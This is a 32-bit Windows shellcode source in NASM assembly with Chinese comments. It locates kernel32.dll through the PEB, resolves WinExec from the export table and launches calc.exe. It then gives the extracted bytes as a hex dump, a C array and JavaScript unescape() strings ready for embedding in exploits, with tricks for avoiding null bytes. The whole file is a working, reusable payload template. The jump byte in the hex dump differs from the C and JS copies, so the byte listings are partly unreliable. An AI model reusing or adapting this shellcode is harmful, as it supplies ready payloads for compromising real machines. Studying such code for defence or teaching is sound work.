;					Author: Anansi
;					Date:	2021/9/11
;				    LICENSE:GPLv3.0
;	github:https://github.com/Pluviophile-BT/shellcode-calc

[bits 32]
[section .text]
global main
main:
	pushad
	mov ebp, esp
	sub esp, 0x28

	xor eax, eax
	mov eax, 0xffffffcf
	not eax						;直接赋予0x30值将会导致00截断，此处使用位取反间接得到0x30
	xor ecx, ecx
	mov ecx, [fs:eax]
	mov ecx, [ecx+0x0C]
	mov ecx, [ecx+0x1C]			;此时ecx指向一个指向首个加载模块的地址
	mov ecx, [ecx]
	mov ecx, [ecx]
	mov ecx, [ecx+0x8]			;拿到kernel32.dll基址

	mov ebx, 0xffffffc3
	not ebx
	mov ebx, [ecx+ebx]
	mov esi, ecx
	add esi, ebx
	mov esi, [esi+0x78]			;拿到EAT表偏移
	mov edi, ecx
	add edi, esi   				;基址+偏移=EAT表实际地址
	mov ebx, [edi+0x14]			;导出表函数个数
	mov eax, [edi+0x1c]			;函数地址表
	mov edx, [edi+0x20]			;函数名称表偏移
	mov esi, [edi+0x24]    		;函数序号表偏移
	add eax, ecx  				;函数地址表实际地址
	add edx, ecx                ;函数名称表实际地址
	add esi, ecx                ;函数序号表实际地址
	mov [esp+0x24], ecx 		;保存模块加载基址到局部变量空间
	mov [esp+0x20], edi			;保存EAT表实际地址
	mov [esp+0x1c], ebx 		;保存函数个数到局部变量
	mov ebx,0x456e6957			;WinE字符串
	xor ecx,ecx
FindFunc:
	mov edi, [edx+ecx*4]		;获取到名称偏移
	add edi, [esp+0x24]			;加上基址为实际地址
	mov edi, [edi]				;取到字符串值
	cmp edi, ebx  				;比较前4字节，相同即为找到
	jz  FuncCall				;找到函数名后跳转
	inc ecx
	cmp ecx,[esp+0x1c]			;比较当ecx >= ebx时直接结束
	jnb TheEnd
	jmp FindFunc
FuncCall:
	xor ebx,ebx
	mov bx, [esi+ecx*0x2]		;取出函数序号
	mov eax, [eax+ebx*0x4]		;取出函数实际地址偏移
	add eax, [esp+0x24]			;取出函数实际地址
	xor ebx,ebx
	add esp, 0x18
	push ebx 					;\x00
	push 0x6578652e				;exe.
	push 0x636c6163 			;clac
	mov edx, esp
	push 0x5 					;SW_SHOW
	push edx
	call eax 					;WinExec
TheEnd:
	mov esp,ebp
	popad
retn

;提取二进制码（0x99bytes)：
;60 89 E5 83 EC 28 31 C0 B8 CF FF FF FF F7 D0 31 C9 64 8B 08 8B 49 0C 8B 49 1C 8B 09 8B 09 8B 49
;08 BB C3 FF FF FF F7 D3 8B 1C 19 89 CE 01 DE 8B 76 78 89 CF 01 F7 8B 5F 14 8B 47 1C 8B 57 20 8B
;77 24 01 C8 01 CA 01 CE 89 4C 24 24 89 7C 24 20 89 5C 24 1C BB 57 69 6E 45 31 C9 8B 3C 8A 03 7C
;24 24 8B 3F 39 DF 74 09 41 3B 4C 24 1C 73 26 EB EA 31 DB 66 8B 1C 4E 8B 04 98 03 44 24 24 31 DB
;83 C4 18 53 68 2E 65 78 65 68 63 61 6C 63 89 E2 6A 05 52 FF D0 89 EC 61 C3




;C风格：
;unsigned char shellcode[] = {
;	"\x60\x89\xE5\x83\xEC\x28\x31\xC0\xB8\xCF\xFF\xFF\xFF\xF7\xD0\x31\xC9\x64\x8B\x08\x8B\x49\x0C\x8B\x49\x1C\x8B\x09\x8B\x09\x8B\x49"
;	"\x08\xBB\xC3\xFF\xFF\xFF\xF7\xD3\x8B\x1C\x19\x89\xCE\x01\xDE\x8B\x76\x78\x89\xCF\x01\xF7\x8B\x5F\x14\x8B\x47\x1C\x8B\x57\x20\x8B"
;	"\x77\x24\x01\xC8\x01\xCA\x01\xCE\x89\x4C\x24\x24\x89\x7C\x24\x20\x89\x5C\x24\x1C\xBB\x57\x69\x6E\x45\x31\xC9\x8B\x3C\x8A\x03\x7C"
;	"\x24\x24\x8B\x3F\x39\xDF\x74\x09\x41\x3B\x4C\x24\x1C\x73\x22\xEB\xEA\x31\xDB\x66\x8B\x1C\x4E\x8B\x04\x98\x03\x44\x24\x24\x31\xDB"
;	"\x83\xC4\x18\x53\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE2\x6A\x05\x52\xFF\xD0\x89\xEC\x61\xC3"
;}

;js风格（因为加了90故多一个字节）：
;shellcode += unescape("%u8960%u83E5%u28EC%uC031%uCFB8%uFFFF");
;shellcode += unescape("%uF7FF%u31D0%u64C9%u088B%u498B%u8B0C");
;shellcode += unescape("%u1C49%u098B%u098B%u498B%uBB08%uFFC3");
;shellcode += unescape("%uFFFF%uD3F7%u1C8B%u8919%u01CE%u8BDE");
;shellcode += unescape("%u7876%uCF89%uF701%u5F8B%u8B14%u1C47");
;shellcode += unescape("%u578B%u8B20%u2477%uC801%uCA01%uCE01");
;shellcode += unescape("%u4C89%u2424%u7C89%u2024%u5C89%u1C24");
;shellcode += unescape("%u57BB%u6E69%u3145%u8BC9%u8A3C%u7C03");
;shellcode += unescape("%u2424%u3F8B%uDF39%u0974%u3B41%u244C");
;shellcode += unescape("%u731C%uEB22%u31EA%u66DB%u1C8B%u8B4E");
;shellcode += unescape("%u9804%u4403%u2424%uDB31%uC483%u5318");
;shellcode += unescape("%u2E68%u7865%u6865%u6163%u636C%uE289");
;shellcode += unescape("%u056A%uFF52%u89D0%u61EC%u90C3"); //此处将00替换为90防止00截断
;另一种写法，建议使用这种
;shellcode += unescape("%u8960%u83E5%u28EC%uC031%uCFB8%uFFFF"+
;		       "%uF7FF%u31D0%u64C9%u088B%u498B%u8B0C"+
;		       "%u1C49%u098B%u098B%u498B%uBB08%uFFC3"+
;		       "%uFFFF%uD3F7%u1C8B%u8919%u01CE%u8BDE"+
;		       "%u7876%uCF89%uF701%u5F8B%u8B14%u1C47"+
;		       "%u578B%u8B20%u2477%uC801%uCA01%uCE01"+
;		       "%u4C89%u2424%u7C89%u2024%u5C89%u1C24"+
;		       "%u57BB%u6E69%u3145%u8BC9%u8A3C%u7C03"+
;		       "%u2424%u3F8B%uDF39%u0974%u3B41%u244C"+
;		       "%u731C%uEB22%u31EA%u66DB%u1C8B%u8B4E"+
;		       "%u9804%u4403%u2424%uDB31%uC483%u5318"+
;		       "%u2E68%u7865%u6865%u6163%u636C%uE289"+
;		       "%u056A%uFF52%u89D0%u61EC%u90C3");
